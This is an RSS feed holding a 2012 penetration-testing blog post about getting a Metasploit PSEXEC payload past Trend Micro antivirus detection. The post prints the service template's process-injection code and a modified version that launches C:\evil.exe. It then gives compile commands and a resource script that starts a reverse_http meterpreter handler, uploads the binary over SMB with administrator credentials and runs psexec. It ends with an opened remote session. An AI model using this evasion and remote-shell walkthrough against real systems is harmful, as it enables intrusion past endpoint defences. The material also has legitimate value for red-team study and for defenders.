<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Compiling on Room362</title>
    <link>http://localhost:1313/tags/compiling/</link>
    <description>Recent content in Compiling on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Thu, 05 Jul 2012 03:44:59 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/compiling/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Bypassing Trend Micro&#39;s Service Protection</title>
      <link>http://localhost:1313/post/2012/201275bypassing-trend-micros-service-protection-html/</link>
      <pubDate>Thu, 05 Jul 2012 03:44:59 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/201275bypassing-trend-micros-service-protection-html/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jabjorkhaug&#34;&gt;@jabjorkhaug&lt;/a&gt; posed the following question on Twitter today:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-0420at203-55-0820pm.png.08%20PM.png&#34; alt=&#34;Screen Shot 2012 07 04 at 3 55 08 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-0420at204-03-1420pm.png.14%20PM.png&#34; alt=&#34;Screen Shot 2012 07 04 at 4 03 14 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The service binary that is used as part of PSEXEC is located here:&lt;/p&gt;

&lt;p&gt;MSF Directory/data/templates/src/pe/exe/service/service.c&lt;/p&gt;

&lt;p&gt;The important part to look at starts at line 57:&lt;/p&gt;

&lt;p&gt;if( CreateProcess( NULL, &amp;ldquo;rundll32.exe&amp;rdquo;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )&lt;/p&gt;

&lt;p&gt;{&lt;/p&gt;

&lt;p&gt;Context.ContextFlags = CONTEXT_FULL;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;GetThreadContext( pi.hThread, &amp;amp;Context );&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );&lt;/p&gt;

&lt;p&gt;if( lpPayload )&lt;/p&gt;

&lt;p&gt;{&lt;/p&gt;

&lt;p&gt;WriteProcessMemory( pi.hProcess, lpPayload, &amp;amp;bPayload, PAYLOAD_SIZE, NULL );&lt;/p&gt;

&lt;p&gt;#ifdef _WIN64&lt;/p&gt;

&lt;p&gt;Context.Rip = (DWORD64)lpPayload;&lt;/p&gt;

&lt;p&gt;#else&lt;/p&gt;

&lt;p&gt;Context.Eip = (DWORD)lpPayload;&lt;/p&gt;

&lt;p&gt;#endif&lt;/p&gt;

&lt;p&gt;SetThreadContext( pi.hThread, &amp;amp;Context );&lt;/p&gt;

&lt;p&gt;}&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;ResumeThread( pi.hThread );&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;CloseHandle( pi.hThread );&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;CloseHandle( pi.hProcess );&lt;/p&gt;

&lt;p&gt;}&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&amp;rsquo;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;

&lt;p&gt;To make this change you replace the above with just this:&lt;/p&gt;

&lt;p&gt;if( CreateProcess( NULL, &amp;ldquo;C:\evil.exe&amp;rdquo;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )&lt;/p&gt;

&lt;p&gt;{&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;CloseHandle( pi.hProcess );&lt;/p&gt;

&lt;p&gt;}&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;i386-mingw32-gcc -o service.exe service.c &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Then just copy it to replace the current one:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;cp service.exe ../../../../template_x86_windows_svc.exe &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;No other changes are needed. Only problem is, how do we get the &amp;ldquo;evil.exe&amp;rdquo; up onto the box for it to execute? That&amp;rsquo;s where the auxiliary module &amp;ldquo;auxiliary/admin/smb/upload&lt;em&gt;file&amp;rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, _remove the comments for it to work&lt;/em&gt;):&lt;/p&gt;

&lt;p&gt;#Start Multi Handler&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use multi/handler&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set PAYLOAD windows/meterpreter/reverse_http&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LHOST 172.16.195.1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LPORT 80&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set ExitOnSession false&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;exploit -j -z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;#Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use auxiliary/admin/smb/upload_file&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LPATH evil.exe&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set RPATH evil.exe&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set RHOST 172.16.195.155&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set SMBUser Administrator&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set SMBPass Password1234!&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;run
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;#Execute PSEXEC using the new service binary that simply executes&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use exploit/windows/smb/psexec&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set RHOST 172.16.195.155&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set SMBUser Administrator&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set SMBPass Password1234!&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set DisablePayloadHandler true&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set PAYLOAD windows/meterpreter/reverse_http&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LHOST 172.16.195.1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LPORT 80&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;exploit -j -z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The passwords could have just as easily been hashes, and the end result is:&lt;/p&gt;

&lt;p&gt;Well I can&amp;rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[*] Meterpreter session 2 opened (172.16.195.1:80 -&amp;gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>